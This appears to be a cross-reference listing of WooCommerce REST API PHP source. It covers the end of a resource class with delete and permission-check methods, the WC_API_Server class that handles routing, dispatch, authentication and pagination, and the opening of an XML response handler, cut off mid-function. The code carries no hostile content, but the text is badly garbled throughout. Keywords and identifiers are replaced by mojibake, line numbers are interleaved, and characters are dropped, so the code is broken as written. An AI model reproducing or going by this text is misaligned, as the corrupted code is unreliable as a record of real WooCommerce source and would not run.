();

244 
	`fÜ—ch
 ( 
$f›lds
 
as
 
$f›ld
 ) {

246 iàĞ
çl£
 !=ğ
	`¡½os
Ğ
$f›ld
, '.' ) ) {

248 
	`li¡
Ğ
$Çme
, 
$v®ue
 ) = 
	`ex¶ode
Ğ'.', 
$f›ld
 );

250 
$sub_f›lds
[ 
$Çme
 ] = 
$v®ue
;

255 
	`fÜ—ch
 ( 
$d©a
 
as
 
$d©a_f›ld
 => 
$d©a_v®ue
 ) {

258 iàĞ
	`is_¬¿y
Ğ
$d©a_v®ue
 ) && 
	`š_¬¿y
Ğ
$d©a_f›ld
, 
	`¬¿y_keys
Ğ
$sub_f›lds
 ) ) ) {

261 
	`fÜ—ch
 ( 
$d©a_v®ue
 
as
 
$sub_f›ld
 => 
$sub_f›ld_v®ue
 ) {

264 iàĞ! 
	`š_¬¿y
Ğ
$sub_f›ld
, 
$sub_f›lds
 ) ) {

265 
	`un£t
Ğ
$d©a
[ 
$d©a_f›ld
 ][ 
$sub_f›ld
 ] );

272 iàĞ! 
	`š_¬¿y
Ğ
$d©a_f›ld
, 
$f›lds
 ) ) {

273 
	`un£t
Ğ
$d©a
[ 
$d©a_f›ld
 ] );

278  
$d©a
;

279 
	}
}

290 
´Ùeùed
 
funùiÚ
 
	$d–‘e
Ğ
$id
, 
$ty³
, 
$fÜû
 = 
çl£
 ) {

292 iàĞ'shİ_Üd”' ==ğ
$ty³
 || 'shop_coupon' === $type )

293 
$»sourû_Çme
 = 
	`¡r_»¶aû
Ğ'shİ_', '', 
$ty³
 );

295 
$»sourû_Çme
 = 
$ty³
;

297 iàĞ'cu¡om”' ==ğ
$ty³
 ) {

299 
$»suÉ
 = 
	`wp_d–‘e_u£r
Ğ
$id
 );

301 iàĞ
$»suÉ
 )

302  
	`¬¿y
Ğ'mes§ge' => 
	`__
( 'Permanently deleted customer', 'woocommerce' ) );

304  
Ãw
 
	`WP_E¼Ü
Ğ'woocomm”û_­i_ÿÂÙ_d–‘e_cu¡om”', 
	`__
Ğ'Thcu¡om” cªnÙ bd–‘ed', 'woocomm”û' ), 
	`¬¿y
( 'status' => 500 ) );

310 
$»suÉ
 = ( 
$fÜû
 ) ? 
	`wp_d–‘e_po¡
Ğ
$id
, 
Œue
 ) : 
	`wp_Œash_po¡
( $id );

312 iàĞ! 
$»suÉ
 )

313  
Ãw
 
	`WP_E¼Ü
Ğ"woocomm”û_­i_ÿÂÙ_d–‘e_{$»sourû_Çme}", 
	`¥rštf
Ğ
	`__
Ğ'Thi % ÿÂÙ bd–‘ed', 'woocomm”û' ), 
$»sourû_Çme
 ), 
	`¬¿y
( 'status' => 500 ) );

315 iàĞ
$fÜû
 ) {

316  
	`¬¿y
Ğ'mes§ge' => 
	`¥rštf
Ğ
	`__
Ğ'P”mª’y d–‘ed %s', 'woocomm”û' ), 
$»sourû_Çme
 ) );

320 
$this
->
£rv”
->
	`£nd_¡©us
( '202' );

322  
	`¬¿y
Ğ'mes§ge' => 
	`¥rštf
Ğ
	`__
Ğ'D–‘ed %s', 'woocomm”û' ), 
$»sourû_Çme
 ) );

325 
	}
}

336 
´Ùeùed
 
funùiÚ
 
	$is_»adabË
Ğ
$po¡
 ) {

338  
$this
->
	`check_³rmissiÚ
Ğ
$po¡
, 'read' );

339 
	}
}

349 
´Ùeùed
 
funùiÚ
 
	$is_ed™abË
Ğ
$po¡
 ) {

351  
$this
->
	`check_³rmissiÚ
Ğ
$po¡
, 'edit' );

353 
	}
}

363 
´Ùeùed
 
funùiÚ
 
	$is_d–‘abË
Ğ
$po¡
 ) {

365  
$this
->
	`check_³rmissiÚ
Ğ
$po¡
, 'delete' );

366 
	}
}

376 
´iv©e
 
funùiÚ
 
	$check_³rmissiÚ
Ğ
$po¡
, 
$cÚ‹xt
 ) {

378 iàĞ! 
	`is_a
Ğ
$po¡
, 'WP_Post' ) )

379 
$po¡
 = 
	`g‘_po¡
( $post );

381 iàĞ
	`is_nuÎ
Ğ
$po¡
 ) )

382  
çl£
;

384 
$po¡_ty³
 = 
	`g‘_po¡_ty³_objeù
Ğ
$po¡
->
po¡_ty³
 );

386 iàĞ'»ad' ==ğ
$cÚ‹xt
 )

387  
	`cu¼’t_u£r_ÿn
Ğ
$po¡_ty³
->
ÿp
->
»ad_´iv©e_po¡s
, 
$po¡
->
ID
 );

389 
	`–£if
 ( 'ed™' ==ğ
$cÚ‹xt
 )

390  
	`cu¼’t_u£r_ÿn
Ğ
$po¡_ty³
->
ÿp
->
ed™_po¡
, 
$po¡
->
ID
 );

392 
	`–£if
 ( 'd–‘e' ==ğ
$cÚ‹xt
 )

393  
	`cu¼’t_u£r_ÿn
Ğ
$po¡_ty³
->
ÿp
->
d–‘e_po¡
, 
$po¡
->
ID
 );

396  
çl£
;

397 
	}
}

	@includes/api/class-wc-api-server.php

1 <?
php


16 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

18 
»quœe_Úû
 
	gABSPATH
 . 'wp-admin/includes/admin.php';

20 şas 
	cWC_API_S”v”
 {

22 cÚ¡ 
	mMETHOD_GET
 = 1;

23 cÚ¡ 
	mMETHOD_POST
 = 2;

24 cÚ¡ 
	mMETHOD_PUT
 = 4;

25 cÚ¡ 
	mMETHOD_PATCH
 = 8;

26 cÚ¡ 
	mMETHOD_DELETE
 = 16;

28 cÚ¡ 
	mREADABLE
 = 1;

29 cÚ¡ 
	mCREATABLE
 = 2;

30 cÚ¡ 
	mEDITABLE
 = 14;

31 cÚ¡ 
	mDELETABLE
 = 16;

32 cÚ¡ 
	mALLMETHODS
 = 31;

37 cÚ¡ 
	mACCEPT_RAW_DATA
 = 64;

40 cÚ¡ 
	mACCEPT_DATA
 = 128;

45 cÚ¡ 
	mHIDDEN_ENDPOINT
 = 256;

51 
public
 
	m$m‘hod_m­
 = 
¬¿y
(

52 'HEAD' => 
£lf
::
METHOD_GET
,

53 'GET' => 
£lf
::
METHOD_GET
,

54 'POST' => 
£lf
::
METHOD_POST
,

55 'PUT' => 
£lf
::
METHOD_PUT
,

56 'PATCH' => 
£lf
::
METHOD_PATCH
,

57 'DELETE' => 
£lf
::
METHOD_DELETE
,

65 
public
 
	m$·th
 = '';

72 
public
 
	m$m‘hod
 = 'HEAD';

82 
public
 
	m$·¿ms
 = 
¬¿y
( 'GET' =>‡rray(), 'POST' =>‡rray() );

89 
public
 
	m$h—d”s
 = 
¬¿y
();

96 
public
 
	m$fes
 = 
¬¿y
();

104 
public
 
	m$hªdËr
;

114 
public
 
funùiÚ
 
	$__cÚ¡ruù
Ğ
$·th
 ) {

116 iàĞ
	`em±y
Ğ
$·th
 ) ) {

117 iàĞ
	`is£t
Ğ
$_SERVER
['PATH_INFO'] ) )

118 
$·th
 = 
$_SERVER
['PATH_INFO'];

120 
$·th
 = '/';

123 
$this
->
·th
 = 
$·th
;

124 
$this
->
m‘hod
 = 
$_SERVER
['REQUEST_METHOD'];

125 
$this
->
·¿ms
['GET'] = 
$_GET
;

126 
$this
->
·¿ms
['POST'] = 
$_POST
;

127 
$this
->
h—d”s
 = $this->
	`g‘_h—d”s
Ğ
$_SERVER
 );

128 
$this
->
fes
 = 
$_FILES
;

131 iàĞ
	`is£t
Ğ
$_GET
['_method'] ) ) {

132 
$this
->
m‘hod
 = 
	`¡¹ouµ”
Ğ
$_GET
['_method'] );

136 iàĞ
$this
->
	`is_jsÚ_»que¡
() )

137 
$hªdËr_şass
 = 'WC_API_JSON_Handler';

139 
	`–£if
 ( 
$this
->
	`is_xml_»que¡
() )

140 
$hªdËr_şass
 = 'WC_API_XML_Handler';

143 
$hªdËr_şass
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_­i_deçuÉ_»¥Ú£_hªdËr', 'WC_API_JSON_HªdËr', 
$this
->
·th
, $this );

145 
$this
->
hªdËr
 = 
Ãw
 
	`$hªdËr_şass
();

154 
public
 
funùiÚ
 
	$check_auth’tiÿtiÚ
() {

157 
$u£r
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_­i_check_auth’tiÿtiÚ', 
nuÎ
, 
$this
 );

160 iàĞ
	`is_a
Ğ
$u£r
, 'WP_User' ) )

161 
	`wp_£t_cu¼’t_u£r
Ğ
$u£r
->
ID
 );

164 
	`–£if
 ( ! 
	`is_wp_”rÜ
Ğ
$u£r
 ) )

165 
$u£r
 = 
Ãw
 
	`WP_E¼Ü
Ğ'woocomm”û_­i_auth’tiÿtiÚ_”rÜ', 
	`__
Ğ'Inv®id‡uth’tiÿtiÚ m‘hod', 'woocomm”û' ), 
	`¬¿y
( 'code' => 500 ) );

167  
$u£r
;

168 
	}
}

181 
´Ùeùed
 
funùiÚ
 
	$”rÜ_to_¬¿y
Ğ
$”rÜ
 ) {

182 
$”rÜs
 = 
	`¬¿y
();

183 
	`fÜ—ch
 ( (
¬¿y
è
$”rÜ
->
”rÜs
 
as
 
$code
 => 
$mes§ges
 ) {

184 
	`fÜ—ch
 ( (
¬¿y
è
$mes§ges
 
as
 
$mes§ge
 ) {

185 
$”rÜs
[] = 
	`¬¿y
Ğ'code' => 
$code
, 'mes§ge' => 
$mes§ge
 );

188  
	`¬¿y
Ğ'”rÜs' => 
$”rÜs
 );

189 
	}
}

200 
public
 
funùiÚ
 
	$£rve_»que¡
() {

202 
	`do_aùiÚ
Ğ'woocomm”û_­i_£rv”_befÜe_£rve', 
$this
 );

204 
$this
->
	`h—d”
Ğ'CÚ‹Á-Ty³', $this->
hªdËr
->
	`g‘_cÚ‹Á_ty³
(), 
Œue
 );

207 iàĞ! 
	`­¶y_f‹rs
Ğ'woocomm”û_­i_’abËd', 
Œue
, 
$this
 ) || ( 'no' ==ğ
	`g‘_İtiÚ
( 'woocommerce_api_enabled' ) ) ) {

209 
$this
->
	`£nd_¡©us
( 404 );

211 
echo
 
$this
->
hªdËr
->
	`g’”©e_»¥Ú£
Ğ
	`¬¿y
( 'errors' =>‡rray( 'code' => 'woocommerce_api_disabled', 'message' => 'The WooCommerce API is disabled onhis site' ) ) );

216 
$»suÉ
 = 
$this
->
	`check_auth’tiÿtiÚ
();

219 iàĞ! 
	`is_wp_”rÜ
Ğ
$»suÉ
 ) ) {

220 
$»suÉ
 = 
$this
->
	`di¥©ch
();

224 iàĞ
	`is_wp_”rÜ
Ğ
$»suÉ
 ) ) {

225 
$d©a
 = 
$»suÉ
->
	`g‘_”rÜ_d©a
();

226 iàĞ
	`is_¬¿y
Ğ
$d©a
 ) && 
	`is£t
( $data['status'] ) ) {

227 
$this
->
	`£nd_¡©us
Ğ
$d©a
['status'] );

230 
$»suÉ
 = 
$this
->
	`”rÜ_to_¬¿y
( $result );

235 
$£rved
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_­i_£rve_»que¡', 
çl£
, 
$»suÉ
, 
$this
 );

237 iàĞ! 
$£rved
 ) {

239 iàĞ'HEAD' ==ğ
$this
->
m‘hod
 )

242 
echo
 
$this
->
hªdËr
->
	`g’”©e_»¥Ú£
Ğ
$»suÉ
 );

244 
	}
}

264 
public
 
funùiÚ
 
	$g‘_rou‹s
() {

267 
$’dpošts
 = 
	`¬¿y
(

269 '/' => 
	`¬¿y
Ğ¬¿yĞ
$this
, 'g‘_šdex' ), 
£lf
::
READABLE
 ),

272 
$’dpošts
 = 
	`­¶y_f‹rs
( 'woocommerce_api_endpoints', $endpoints );

275 
	`fÜ—ch
 ( 
$’dpošts
 
as
 
$rou‹
 => &
$hªdËrs
 ) {

276 iàĞ
	`couÁ
Ğ
$hªdËrs
 ) <ğ2 && 
	`is£t
Ğ$hªdËrs[1] ) && ! 
	`is_¬¿y
( $handlers[1] ) ) {

277 
$hªdËrs
 = 
	`¬¿y
( $handlers );

281  
$’dpošts
;

282 
	}
}

290 
public
 
funùiÚ
 
	$di¥©ch
() {

292  
$this
->
m‘hod
 ) {

296 
$m‘hod
 = 
£lf
::
METHOD_GET
;

300 
$m‘hod
 = 
£lf
::
METHOD_POST
;

304 
$m‘hod
 = 
£lf
::
METHOD_PUT
;

308 
$m‘hod
 = 
£lf
::
METHOD_PATCH
;

312 
$m‘hod
 = 
£lf
::
METHOD_DELETE
;

316  
Ãw
 
	`WP_E¼Ü
Ğ'woocomm”û_­i_unsuµÜ‹d_m‘hod', 
	`__
Ğ'UnsuµÜ‹d„eque¡ m‘hod', 'woocomm”û' ), 
	`¬¿y
( 'status' => 400 ) );

319 
	`fÜ—ch
 ( 
$this
->
	`g‘_rou‹s
(è
as
 
$rou‹
 => 
$hªdËrs
 ) {

320 
	`fÜ—ch
 ( 
$hªdËrs
 
as
 
$hªdËr
 ) {

321 
$ÿÎback
 = 
$hªdËr
[0];

322 
$suµÜ‹d
 = 
	`is£t
Ğ
$hªdËr
[1] ) ? $hªdËr[1] : 
£lf
::
METHOD_GET
;

324 iàĞ!Ğ
$suµÜ‹d
 & 
$m‘hod
 ) )

327 
$m©ch
 = 
	`´eg_m©ch
Ğ'@^' . 
$rou‹
 . '$@i', 
	`u¾decode
Ğ
$this
->
·th
 ), 
$¬gs
 );

329 iàĞ!
$m©ch
 )

332 iàĞ! 
	`is_ÿÎabË
Ğ
$ÿÎback
 ) )

333  
Ãw
 
	`WP_E¼Ü
Ğ'woocomm”û_­i_šv®id_hªdËr', 
	`__
Ğ'ThhªdË¸fÜhrou‹ i šv®id', 'woocomm”û' ), 
	`¬¿y
( 'status' => 500 ) );

335 
$¬gs
 = 
	`¬¿y_m”ge
Ğ$¬gs, 
$this
->
·¿ms
['GET'] );

336 iàĞ
$m‘hod
 & 
£lf
::
METHOD_POST
 ) {

337 
$¬gs
 = 
	`¬¿y_m”ge
Ğ$¬gs, 
$this
->
·¿ms
['POST'] );

339 iàĞ
$suµÜ‹d
 & 
£lf
::
ACCEPT_DATA
 ) {

340 
$d©a
 = 
$this
->
hªdËr
->
	`·r£_body
Ğ$this->
	`g‘_¿w_d©a
() );

341 
$¬gs
 = 
	`¬¿y_m”ge
Ğ$¬gs, 
	`¬¿y
Ğ'd©a' => 
$d©a
 ) );

343 
	`–£if
 ( 
$suµÜ‹d
 & 
£lf
::
ACCEPT_RAW_DATA
 ) {

344 
$d©a
 = 
$this
->
	`g‘_¿w_d©a
();

345 
$¬gs
 = 
	`¬¿y_m”ge
Ğ$¬gs, 
	`¬¿y
Ğ'd©a' => 
$d©a
 ) );

348 
$¬gs
['_m‘hod'] = 
$m‘hod
;

349 
$¬gs
['_rou‹'] = 
$rou‹
;

350 
$¬gs
['_·th'] = 
$this
->
·th
;

351 
$¬gs
['_h—d”s'] = 
$this
->
h—d”s
;

352 
$¬gs
['_fes'] = 
$this
->
fes
;

354 
$¬gs
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_­i_di¥©ch_¬gs', $¬gs, 
$ÿÎback
 );

357 iàĞ
	`is_wp_”rÜ
Ğ
$¬gs
 ) ) {

358  
$¬gs
;

361 
$·¿ms
 = 
$this
->
	`sÜt_ÿÎback_·¿ms
Ğ
$ÿÎback
, 
$¬gs
 );

362 iàĞ
	`is_wp_”rÜ
Ğ
$·¿ms
 ) )

363  
$·¿ms
;

365  
	`ÿÎ_u£r_func_¬¿y
Ğ
$ÿÎback
, 
$·¿ms
 );

369  
Ãw
 
	`WP_E¼Ü
Ğ'woocomm”û_­i_no_rou‹', 
	`__
Ğ'NØrou‹ wa found m©chšghURL‡nd„eque¡ m‘hod', 'woocomm”û' ), 
	`¬¿y
( 'status' => 404 ) );

370 
	}
}

383 
´Ùeùed
 
funùiÚ
 
	$sÜt_ÿÎback_·¿ms
Ğ
$ÿÎback
, 
$´ovided
 ) {

384 iàĞ
	`is_¬¿y
Ğ
$ÿÎback
 ) )

385 
$»f_func
 = 
Ãw
 
	`ReæeùiÚM‘hod
Ğ
$ÿÎback
[0], $callback[1] );

387 
$»f_func
 = 
Ãw
 
	`ReæeùiÚFunùiÚ
Ğ
$ÿÎback
 );

389 
$wª‹d
 = 
$»f_func
->
	`g‘P¬am‘”s
();

390 
$Üd”ed_·¿m‘”s
 = 
	`¬¿y
();

392 
	`fÜ—ch
 ( 
$wª‹d
 
as
 
$·¿m
 ) {

393 iàĞ
	`is£t
Ğ
$´ovided
[ 
$·¿m
->
	`g‘Name
() ] ) ) {

396 
$Üd”ed_·¿m‘”s
[] = 
	`is_¬¿y
Ğ
$´ovided
[ 
$·¿m
->
	`g‘Name
(è] ) ? 
	`¬¿y_m­
Ğ'u¾decode', $´ovided[ $·¿m->g‘Name(è] ) : 
	`u¾decode
( $provided[ $param->getName() ] );

398 
	`–£if
 ( 
$·¿m
->
	`isDeçuÉV®ueAvaabË
() ) {

400 
$Üd”ed_·¿m‘”s
[] = 
$·¿m
->
	`g‘DeçuÉV®ue
();

404  
Ãw
 
	`WP_E¼Ü
Ğ'woocomm”û_­i_missšg_ÿÎback_·¿m', 
	`¥rštf
Ğ
	`__
Ğ'Missšg…¬am‘” %s', 'woocomm”û' ), 
$·¿m
->
	`g‘Name
(è), 
	`¬¿y
( 'status' => 400 ) );

407  
$Üd”ed_·¿m‘”s
;

408 
	}
}

418 
public
 
funùiÚ
 
	$g‘_šdex
() {

421 
$avaabË
 = 
	`¬¿y
( 'store' =>‡rray(

422 'Çme' => 
	`g‘_İtiÚ
( 'blogname' ),

423 'desütiÚ' => 
	`g‘_İtiÚ
( 'blogdescription' ),

424 'URL' => 
	`g‘_İtiÚ
( 'siteurl' ),

425 'wc_v”siÚ' => 
	`WC
()->
v”siÚ
,

426 'rou‹s' => 
	`¬¿y
(),

427 'm‘a' => 
	`¬¿y
(

428 'timezÚe' => 
	`wc_timezÚe_¡ršg
(),

429 'cu¼’cy' => 
	`g‘_woocomm”û_cu¼’cy
(),

430 'cu¼’cy_fÜm©' => 
	`g‘_woocomm”û_cu¼’cy_symbŞ
(),

431 'x_šşuded' => ( 'yes' ==ğ
	`g‘_İtiÚ
( 'woocommerce_prices_include_tax' ) ),

432 'weight_un™' => 
	`g‘_İtiÚ
( 'woocommerce_weight_unit' ),

433 'dim’siÚ_un™' => 
	`g‘_İtiÚ
( 'woocommerce_dimension_unit' ),

434 's¦_’abËd' => ( 'yes' ==ğ
	`g‘_İtiÚ
( 'woocommerce_force_ssl_checkout' ) ),

435 '³rm®šks_’abËd' => ( '' !=ğ
	`g‘_İtiÚ
( 'permalink_structure' ) ),

436 'lšks' => 
	`¬¿y
(

443 
	`fÜ—ch
 ( 
$this
->
	`g‘_rou‹s
(è
as
 
$rou‹
 => 
$ÿÎbacks
 ) {

444 
$d©a
 = 
	`¬¿y
();

446 
$rou‹
 = 
	`´eg_»¶aû
( '#\(\?P(<\w+?>).*?\)#', '$1', $route );

447 
$m‘hods
 = 
	`¬¿y
();

448 
	`fÜ—ch
 ( 
£lf
::
$m‘hod_m­
 
as
 
$Çme
 => 
$b™mask
 ) {

449 
	`fÜ—ch
 ( 
$ÿÎbacks
 
as
 
$ÿÎback
 ) {

451 iàĞ
$ÿÎback
[1] & 
£lf
::
HIDDEN_ENDPOINT
 )

454 iàĞ
$ÿÎback
[1] & 
$b™mask
 )

455 
$d©a
['suµÜts'][] = 
$Çme
;

457 iàĞ
$ÿÎback
[1] & 
£lf
::
ACCEPT_DATA
 )

458 
$d©a
['acû±s_d©a'] = 
Œue
;

461 iàĞ
	`¡½os
Ğ
$rou‹
, '<' ) ==ğ
çl£
 ) {

462 
$d©a
['m‘a'] = 
	`¬¿y
(

463 '£lf' => 
	`g‘_woocomm”û_­i_u¾
Ğ
$rou‹
 ),

468 
$avaabË
['¡Üe']['rou‹s'][ 
$rou‹
 ] = 
	`­¶y_f‹rs
Ğ'woocomm”û_­i_’dpošts_desütiÚ', 
$d©a
 );

470  
	`­¶y_f‹rs
Ğ'woocomm”û_­i_šdex', 
$avaabË
 );

471 
	}
}

479 
public
 
funùiÚ
 
	$£nd_¡©us
Ğ
$code
 ) {

480 
	`¡©us_h—d”
Ğ
$code
 );

481 
	}
}

491 
public
 
funùiÚ
 
	$h—d”
Ğ
$key
, 
$v®ue
, 
$»¶aû
 = 
Œue
 ) {

492 
	`h—d”
Ğ
	`¥rštf
Ğ'%s: %s', 
$key
, 
$v®ue
 ), 
$»¶aû
 );

493 
	}
}

508 
public
 
funùiÚ
 
lšk_h—d”
Ğ
$»l
, 
$lšk
, 
$Ùh”
 = 
	$¬¿y
() ) {

510 
$h—d”
 = 
	`¥rštf
Ğ'<%s>;„–="%s"', 
$lšk
, 
	`esc_©Œ
Ğ
$»l
 ) );

512 
	`fÜ—ch
 ( 
$Ùh”
 
as
 
$key
 => 
$v®ue
 ) {

514 iàĞ't™Ë' =ğ
$key
 ) {

516 
$v®ue
 = '"' . $value . '"';

519 
$h—d”
 .ğ'; ' . 
$key
 . '=' . 
$v®ue
;

522 
$this
->
	`h—d”
Ğ'Lšk', 
$h—d”
, 
çl£
 );

523 
	}
}

531 
public
 
funùiÚ
 
	$add_·gš©iÚ_h—d”s
Ğ
$qu”y
 ) {

534 iàĞ
	`is_a
Ğ
$qu”y
, 'WP_User_Query' ) ) {

536 
$·ge
 = 
$qu”y
->
·ge
;

537 
$sšgË
 = 
	`couÁ
Ğ
$qu”y
->
	`g‘_»suÉs
() ) > 1;

538 
$tÙ®
 = 
$qu”y
->
	`g‘_tÙ®
();

539 
$tÙ®_·ges
 = 
$qu”y
->
tÙ®_·ges
;

544 
$·ge
 = 
$qu”y
->
	`g‘
( 'paged' );

545 
$sšgË
 = 
$qu”y
->
	`is_sšgË
();

546 
$tÙ®
 = 
$qu”y
->
found_po¡s
;

547 
$tÙ®_·ges
 = 
$qu”y
->
max_num_·ges
;

550 iàĞ! 
$·ge
 )

551 
$·ge
 = 1;

553 
$Ãxt_·ge
 = 
	`absšt
Ğ
$·ge
 ) + 1;

555 iàĞ! 
$sšgË
 ) {

558 iàĞ
$·ge
 > 1 ) {

559 
$this
->
	`lšk_h—d”
Ğ'fœ¡', $this->
	`g‘_·gš©ed_u¾
( 1 ) );

560 
$this
->
	`lšk_h—d”
Ğ'´ev', $this->
	`g‘_·gš©ed_u¾
Ğ
$·ge
 -1 ) );

564 iàĞ
$Ãxt_·ge
 <ğ
$tÙ®_·ges
 ) {

565 
$this
->
	`lšk_h—d”
Ğ'Ãxt', $this->
	`g‘_·gš©ed_u¾
Ğ
$Ãxt_·ge
 ) );

569 iàĞ
$·ge
 !ğ
$tÙ®_·ges
 )

570 
$this
->
	`lšk_h—d”
Ğ'Ï¡', $this->
	`g‘_·gš©ed_u¾
Ğ
$tÙ®_·ges
 ) );

573 
$this
->
	`h—d”
Ğ'X-WC-TÙ®', 
$tÙ®
 );

574 
$this
->
	`h—d”
Ğ'X-WC-TÙ®Pages', 
$tÙ®_·ges
 );

576 
	`do_aùiÚ
Ğ'woocomm”û_­i_·gš©iÚ_h—d”s', 
$this
, 
$qu”y
 );

577 
	}
}

586 
´iv©e
 
funùiÚ
 
	$g‘_·gš©ed_u¾
Ğ
$·ge
 ) {

589 
$»que¡
 = 
	`»move_qu”y_¬g
( 'page' );

592 
$»que¡
 = 
	`u¾decode
Ğ
	`add_qu”y_¬g
Ğ'·ge', 
$·ge
, $request ) );

595 
$ho¡
 = 
	`·r£_u¾
Ğ
	`g‘_home_u¾
(), 
PHP_URL_HOST
 );

597  
	`£t_u¾_scheme
( "http://{$host}{$request}" );

598 
	}
}

606 
public
 
funùiÚ
 
	$g‘_¿w_d©a
() {

607 
glob®
 
$HTTP_RAW_POST_DATA
;

611 iàĞ!
	`is£t
Ğ
$HTTP_RAW_POST_DATA
 ) ) {

612 
$HTTP_RAW_POST_DATA
 = 
	`fe_g‘_cÚ‹Ás
( 'php://input' );

615  
$HTTP_RAW_POST_DATA
;

616 
	}
}

627 
public
 
funùiÚ
 
	$·r£_d©‘ime
Ğ
$d©‘ime
 ) {

630 iàĞ
	`¡½os
Ğ
$d©‘ime
, '.' ) !=ğ
çl£
 ) {

631 
$d©‘ime
 = 
	`´eg_»¶aû
( '/\.\d+/', '', $datetime );

635 
$d©‘ime
 = 
	`´eg_»¶aû
( '/[+-]\d+:+\d+$/', '+00:00', $datetime );

637 
Œy
 {

639 
$d©‘ime
 = 
Ãw
 
	`D©eTime
Ğ$d©‘ime,‚ew 
	`D©eTimeZÚe
( 'UTC' ) );

641 } 
	`ÿtch
 ( 
Exû±iÚ
 
$e
 ) {

643 
$d©‘ime
 = 
Ãw
 
	`D©eTime
( '@0' );

647  
$d©‘ime
->
	`fÜm©
( 'Y-m-d H:i:s' );

648 
	}
}

658 
public
 
funùiÚ
 
	$fÜm©_d©‘ime
Ğ
$time¡amp
, 
$cÚv”t_to_utc
 = 
çl£
 ) {

660 iàĞ
$cÚv”t_to_utc
 ) {

661 
$timezÚe
 = 
Ãw
 
	`D©eTimeZÚe
Ğ
	`wc_timezÚe_¡ršg
() );

663 
$timezÚe
 = 
Ãw
 
	`D©eTimeZÚe
( 'UTC' );

666 
Œy
 {

668 iàĞ
	`is_num”ic
Ğ
$time¡amp
 ) ) {

669 
$d©e
 = 
Ãw
 
	`D©eTime
( "@{$timestamp}" );

671 
$d©e
 = 
Ãw
 
	`D©eTime
Ğ
$time¡amp
, 
$timezÚe
 );

675 iàĞ
$cÚv”t_to_utc
 ) {

676 
$d©e
->
	`modify
Ğ-1 * $d©e->
	`g‘Off£t
() . ' seconds' );

679 } 
	`ÿtch
 ( 
Exû±iÚ
 
$e
 ) {

681 
$d©e
 = 
Ãw
 
	`D©eTime
( '@0' );

684  
$d©e
->
	`fÜm©
( 'Y-m-d\TH:i:s\Z' );

685 
	}
}

694 
public
 
funùiÚ
 
	$g‘_h—d”s
(
$£rv”
) {

695 
$h—d”s
 = 
	`¬¿y
();

697 
$add™iÚ®
 = 
	`¬¿y
('CONTENT_LENGTH' => 
Œue
, 'CONTENT_MD5' =>rue, 'CONTENT_TYPE' =>rue);

699 
	`fÜ—ch
 (
$£rv”
 
as
 
$key
 => 
$v®ue
) {

700 iàĞ
	`¡½os
Ğ
$key
, 'HTTP_' ) === 0) {

701 
$h—d”s
[ 
	`sub¡r
Ğ
$key
, 5 ) ] = 
$v®ue
;

703 
	`–£if
 ( 
	`is£t
Ğ
$add™iÚ®
[ 
$key
 ] ) ) {

704 
$h—d”s
[ 
$key
 ] = 
$v®ue
;

708  
$h—d”s
;

709 
	}
}

718 
´iv©e
 
funùiÚ
 
	$is_jsÚ_»que¡
() {

721 iàĞ
çl£
 !=ğ
	`¡ros
Ğ
$this
->
·th
, '.json' ) )

722  
Œue
;

725 iàĞ
	`is£t
Ğ
$this
->
h—d”s
['ACCEPT'] ) && 'application/json' == $this->headers['ACCEPT'] )

726  
Œue
;

728  
çl£
;

729 
	}
}

738 
´iv©e
 
funùiÚ
 
	$is_xml_»que¡
() {

741 iàĞ
çl£
 !=ğ
	`¡ros
Ğ
$this
->
·th
, '.xml' ) )

742  
Œue
;

745 iàĞ
	`is£t
Ğ
$this
->
h—d”s
['ACCEPT'] ) && ( 'application/xml' == $this->headers['ACCEPT'] || 'text/xml' == $this->headers['ACCEPT'] ) )

746  
Œue
;

748  
çl£
;

749 
	}
}

	@includes/api/class-wc-api-xml-handler.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

15 şas 
	cWC_API_XML_HªdËr
 
im¶em’ts
 
	mWC_API_HªdËr
 {

18 
´iv©e
 
	m$xml
;

25 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

28 
	`add_f‹r
Ğ'woocomm”û_­i_»pÜt_»¥Ú£', 
	`¬¿y
Ğ
$this
, 'format_sales_report_data' ), 100 );

31 
	`add_f‹r
Ğ'woocomm”û_­i_´oduù_»¥Ú£', 
	`¬¿y
Ğ
$this
, 'format_product_data' ), 100 );

40 
public
 
funùiÚ
 
	$g‘_cÚ‹Á_ty³
() {

42  '­¶iÿtiÚ/xml; ch¬£t=' . 
	`g‘_İtiÚ
( 'blog_charset' );

43 
	}
}

52 
public
 
funùiÚ
 
	$·r£_body
Ğ
$d©a
 ) {

55 
	}
}

64 
public
 
funùiÚ
 
	$g’”©e_»¥Ú£
Ğ
$d©a
 ) {

66 
$this
->
xml
 = 
Ãw
 
	`XMLWr™”
();

68 
$this
->
xml
->
	`İ’MemÜy
();

70 
$this
->
xml
->
	`£tInd’t
(
Œue
);

72 
$this
->
xml
->
	`¡¬tDocum’t
( '1.0', 'UTF-8' );

74 
$roÙ_–em’t
 = 
	`key
Ğ
$d©a
 );

76 
$d©a
 = $d©a[ 
$roÙ_–em’t
 ];

78  
$roÙ_–em’t
 ) {

81 
$d©a
 = 
	`¬¿y
( 'order' => $data );

85 
$d©a
 = 
	`¬¿y
( 'order_note' => $data );

89 
$d©a
 = 
	`¬¿y
( 'customer' => $data );

93 
$d©a
 = 
	`¬¿y
( 'coupon' => $data );

97 
$d©a
 = 
	`¬¿y
( 'product' => $data );

101 
$d©a
 = 
	`¬¿y
( 'product_review' => $data );

105 
$d©a
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_­i_xml_d©a', $d©a, 
$roÙ_–em’t
 );

110 
$this
->
	`¬¿y_to_xml
Ğ
$roÙ_–em’t
, 
$d©a
 );

112 
$this
->
xml
->
	`’dDocum’t
();

114  
$this
->
xml
->
	`ouutMemÜy
();

115 
	}
}

125 
´iv©e
 
funùiÚ
 
¬¿y_to_xml
Ğ
$–em’t_key
, 
$–em’t_v®ue
 = 
	$¬¿y
() ) {

127 iàĞ
	`is_¬¿y
Ğ
$–em’t_v®ue
 ) ) {

130 iàĞ'@©Œibu‹s' ==ğ
$–em’t_key
 ) {

131 
	`fÜ—ch
 ( 
$–em’t_v®ue
 
as
 
$©Œibu‹_key
 => 
$©Œibu‹_v®ue
 ) {

133 
$this
->
xml
->
	`¡¬tA‰ribu‹
Ğ
$©Œibu‹_key
 );

134 
$this
->
